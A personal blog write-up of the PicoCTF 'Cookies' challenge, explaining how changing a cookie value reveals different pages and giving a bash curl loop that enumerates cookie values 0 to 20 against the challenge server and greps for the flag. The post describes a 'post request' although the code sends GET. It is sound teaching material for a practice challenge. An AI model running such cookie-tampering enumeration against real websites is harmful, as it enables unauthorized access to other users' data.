+++
title = "Cookies Writeup (PicoCTF)"
date = "2021-07-19"
updated = "2024-07-12"
+++

# Cookies

Looking at the website provided, if we try and enter an arbitrary input, it would prompt us that the input is invalid. However, if we use the placeholder text `snickerdoodle` we see that it gives us a page where the text is set to `I love snickerdoodle cookies!`.

## Method
Looking at the cookie set after entering `snickerdoodle` we see that it has a value of 0. By testing around and changing the cookie value to `1`, `2` etc. we see that it outputs a different name. My guess is that a certain cookie value will return us the flag.

### Script
The scipt has a bash for loop to loop through `1-20` and curl to send the requests. Then we send the post requests and grep the output for `pico`. And we get our flag!

```sh
for name in {0..20} ;do curl -i -s -k -X $'GET' \
    -H $'Host: mercury.picoctf.net:6418' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'name='$name'' \
    $'http://mercury.picoctf.net:6418/check' | grep pico ;done
```


---

*I'm Kshitij, a detection engineer looking for SOC/IR/CTI roles. If this was useful, [connect on LinkedIn](https://linkedin.com/in/kshitijchitnis) or [browse my GitHub](https://github.com/m0rphtail/).*
